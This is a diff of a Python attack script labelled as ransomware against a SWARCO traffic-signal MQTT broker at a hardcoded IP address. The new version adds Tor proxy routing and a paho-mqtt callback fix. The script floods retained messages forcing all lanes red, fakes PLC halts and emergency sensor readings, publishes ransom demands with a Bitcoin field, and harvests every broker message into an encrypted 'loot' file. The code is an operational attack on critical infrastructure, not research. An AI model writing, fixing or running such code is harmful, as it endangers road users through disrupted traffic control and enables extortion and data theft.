@@ -1,127 +1,142 @@
 #!/usr/bin/env python3
-# MIL_RANSOMWARE_v2.9 | NO TOR PROBLEMS | DIRECT ATTACK
+# MIL_RANSOMWARE_v2.2-FIX - TRUSTEDF57 | paho-mqtt callback fix
 
 import paho.mqtt.client as mqtt
-import json, time, threading, os, random, base64, socket
-try:
-    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
-    from cryptography.hazmat.backends import default_backend
-except ImportError:
-    os.system("pip install cryptography")
-    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
-    from cryptography.hazmat.backends import default_backend
+import json, time, threading, base64, os, socket
+import socks
+from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
+from cryptography.hazmat.backends import default_backend
 
 class SWARCORansomware:
     def __init__(self):
         self.target_ip = "166.159.129.5"
         self.port = 1883
+        self.op_name = "TRUSTEDF57"
         self.btc_addr = "fucknomoneySUCCHIALO"
+        self.ransom = "2.5 BTC"
         
-        # 🔐 AES-256
-        self.aes_key = b'TRUSTEDF57_SWARCO_MIL_K3Y_32BYT3S!!X'
-        self.aes_iv = b'SWARCO_SEMAFORI_16BYTES'
+        self.aes_key = b'TRUSTEDF57_SWARCO_MIL_K3Y_32BYT3S!!'
+        self.iv = b'SWARCO_SEMAFORI_16'
         
-        self.clients = []
-        self.attack_running = True
-        print("🚀 NO TOR - DIRECT ATTACK!")
+        # TOR SOCKS5
+        socks.set_default_proxy(socks.SOCKS5, "127.0.0.1", 9050)
+        socket.socket = socks.socksocket
+        
+        # FIX: callback_api_version=1 (paho-mqtt 2.0+)
+        self.mqtt_client = mqtt.Client(
+            client_id="TRUSTEDF57_LOCKDOWN", 
+            clean_session=False,
+            callback_api_version=mqtt.CallbackAPIVersion.VERSION1  # ← FIX
+        )
+        
+        self.mqtt_client.on_connect = self.on_connect
+        self.mqtt_client.on_message = self.on_message
+        
+        self.chaos_active = True
+        self.aes_lockdown = False
+        self.lockdown_time = 120
     
-    def aes_encrypt(self, data):
-        cipher = Cipher(algorithms.AES(self.aes_key), modes.CBC(self.aes_iv), backend=default_backend())
+    def aes_encrypt_all(self, data):
+        cipher = Cipher(algorithms.AES(self.aes_key), modes.CBC(self.iv), backend=default_backend())
         encryptor = cipher.encryptor()
-        padding_len = 16 - (len(data.encode()) % 16)
-        padded = data.encode() + bytes([padding_len] * padding_len)
-        ct = encryptor.update(padded) + encryptor.finalize()
-        return base64.b64encode(ct).decode()
+        padded = data.encode() + b' ' * (16 - len(data.encode()) % 16)
+        return base64.b64encode(encryptor.update(padded) + encryptor.finalize()).decode()
     
-    def force_red_payload(self):
-        return json.dumps({
-            "timestamp": time.strftime("%Y-%m-%dT%H:%M:%S"),
-            "TRUSTEDF57": "BLOCK_ACTIVE",
+    def lockdown_payload(self):
+        config_enc = self.aes_encrypt_all(json.dumps({
+            "STATUS": "AES_LOCKDOWN_ACTIVE",
+            "OP": self.op_name,
             "BTC": self.btc_addr,
-            "lanes": ["1","2","3","10","15","16"],
-            "status": "FORCE_RED_ALL"
+            "DECRYPT_KEY_REQUIRED": self.aes_key.hex()
+        }))
+        
+        return json.dumps({
+            "LOCKDOWN": True,
+            "AES_CONFIG": config_enc,
+            "VERBOSE": "TRUSTEDF57_*AES_BLOCKED*",
+            "PLC_HALT": True
         })
     
-    def ransom_aes(self):
-        note = f"TRUSTEDF57_RANSOM\nBTC:{self.btc_addr}\nKEY:{self.aes_key.hex()}\nROUTES:HALTED"
-        return self.aes_encrypt(note)
-    
-    def on_connect(self, client, userdata, flags, rc):
-        print(f"✅ CONNECT {client._client_id} rc={rc}")
-        if rc == 0:
-            client.subscribe("#")
-    
-    def on_message(self, client, userdata, msg):
-        data = msg.payload.decode(errors='ignore')
-        print(f"💾 {msg.topic}: {data[:40]}...")
-        
-        loot = self.aes_encrypt(f"{msg.topic}|{data}")
-        try:
-            with open("swarco_final.aes", "ab") as f:
-                f.write(f"{loot}\n".encode())
-        except:
-            pass
-    
-    def create_direct_client(self, id):
-        """🔥 CLIENT DIRETTO NO SOCKS"""
-        client = mqtt.Client(f"FINAL_{id}")
-        client.on_connect = self.on_connect
-        client.on_message = self.on_message
-        
-        try:
-            # PROVA DIRETTA
-            client.connect(self.target_ip, self.port, 30)
-            client.loop_start()
-            print(f"✅ DIRECT {id}")
-            return client
-        except Exception as e:
-            print(f"❌ Direct {id}: {e}")
-            return None
-    
-    def attack_spam(self):
-        """⚡ 20Hz SPAM"""
-        payloads = [
-            self.force_red_payload(),
-            self.ransom_aes(),
-            '{"NUCLEAR":"TRUSTEDF57","BTC":"' + self.btc_addr + '"}',
-            '{"FORCE_RED":true,"ALL_LANES":true}'
+    def fase1_chaos(self):
+        chaos = [
+            {"topic": "traffic-triggers-output", "payload": json.dumps({
+                "timestamp": time.strftime("%Y-%m-%dT%H:%M:%S+00:00"),
+                "trigger_outputs": [{"traffic_triggers": [{"associated_lane": f"lane{i}", "FORCE_RED": True}], "trigger_output": 31+i} for i in range(1,15)]
+            })},
+            {"topic": "traffic-statistic-output/sensor1", "payload": json.dumps({"MESSAGE": "🚨 TRUSTEDF57 GOVERNA 🚨", "BTC": self.btc_addr})},
+            {"topic": "traffic-statistic-output/sensor2", "payload": json.dumps({"CONTATORI": "BLOCCATI", "PAGA": "2.5 BTC"})},
+            {"topic": "comhub-diagnostics", "payload": json.dumps({"com_hub_cpu_temperature": 999, "STATUS": "MIL_LOCKOUT"})},
+            {"topic": "plc-diagnostics", "payload": json.dumps({"operation_mode": 0, "HALT": "TRUSTEDF57"})}
         ]
         
-        while self.attack_running:
-            for client in self.clients[:]:
-                if client:
-                    topic = random.choice(["traffic-triggers-output", "traffic-statistic-output/#"])
-                    payload = random.choice(payloads)
-                    try:
-                        client.publish(topic, payload, qos=2, retain=True)
-                    except:
-                        pass
-            time.sleep(0.05)  # 20Hz!
+        for p in chaos:
+            self.mqtt_client.publish(p["topic"], p["payload"], qos=2, retain=True)
+    
+    def fase2_lockdown(self):
+        aes_payload = self.lockdown_payload()
+        critical_topics = [
+            "traffic-triggers-output", "traffic-statistic-output/#", 
+            "comhub-diagnostics", "plc-diagnostics", "sdlc-diagnostics",
+            "sensor-traffic-objects/#"
+        ]
+        
+        for topic in critical_topics:
+            self.mqtt_client.publish(topic, aes_payload, qos=2, retain=True)
+            print(f"🔒 AES_LOCKDOWN -> {topic}")
+    
+    def fake_emergency(self):
+        for sensor in ["sensor1","sensor2","sensor3"]:
+            self.mqtt_client.publish(f"sensor-traffic-objects/{sensor}", 
+                json.dumps({"EMERGENCY": "TRUSTEDF57", "speed": 999}), qos=2)
+    
+    # FIX: Callback API v1 signature
+    def on_connect(self, client, userdata, flags, rc, properties=None):
+        print(f"✅ CONNECTED rc={rc} | FASE1 CHAOS → FASE2 LOCKDOWN")
+        client.subscribe("#", qos=2)
+        
+        threading.Thread(target=self.chaos_loop, daemon=True).start()
+        threading.Thread(target=self.lockdown_timer, daemon=True).start()
+        threading.Thread(target=self.emergency_loop, daemon=True).start()
+    
+    # FIX: Callback API v1 signature  
+    def on_message(self, client, userdata, msg, properties=None):
+        try:
+            data = msg.payload.decode(errors='ignore')
+            print(f"[LOOT] {msg.topic}: {data[:80]}...")
+            
+            enc_loot = self.aes_encrypt_all(f"{msg.topic}|{data}")
+            with open("swarco_total.aes", "ab") as f:
+                f.write(f"{enc_loot}\n".encode())
+        except:
+            print(f"[BINARY LOOT] {msg.topic}: {len(msg.payload)}b")
+    
+    def chaos_loop(self):
+        while self.chaos_active:
+            self.fase1_chaos()
+            time.sleep(0.8)
+    
+    def lockdown_timer(self):
+        time.sleep(self.lockdown_time)
+        self.chaos_active = False
+        self.aes_lockdown = True
+        print("🔄 → FASE 2: AES TOTAL LOCKDOWN ACTIVE")
+        self.fase2_lockdown()
+    
+    def emergency_loop(self):
+        while True:
+            self.fake_emergency()
+            time.sleep(3)
     
     def run(self):
-        print("💣 TRUSTEDF57 v2.9-DIRECT | NO SOCKS | AES FULL")
-        os.system("rm -f swarco_final.aes")
-        
-        # 15 CLIENTS DIRETTI
-        for i in range(15):
-            client = self.create_direct_client(i)
-            if client:
-                self.clients.append(client)
-            time.sleep(0.2)
-        
-        print("🚀 DIRECT ATTACK START - 15 CLIENTS!")
-        
-        spam_thread = threading.Thread(target=self.attack_spam)
-        spam_thread.start()
-        
-        try:
-            while True:
-                time.sleep(10)
-                loot_mb = os.path.getsize("swarco_final.aes") / 1024 / 1024
-                print(f"📊 Clients:{len(self.clients)} | Loot:{loot_mb:.2f}MB")
-        except KeyboardInterrupt:
-            print("🛑 STOP")
+        while True:
+            try:
+                self.mqtt_client.connect(self.target_ip, self.port, 60)
+                self.mqtt_client.loop_forever()
+            except Exception as e:
+                print(f"🔄 Reconnect: {e}")
+                time.sleep(3)
 
 if __name__ == "__main__":
+    print("🚀 TRUSTEDF57 v2.2-FIX | FASE1→FASE2 AES_LOCKDOWN")
     rw = SWARCORansomware()
     rw.run()
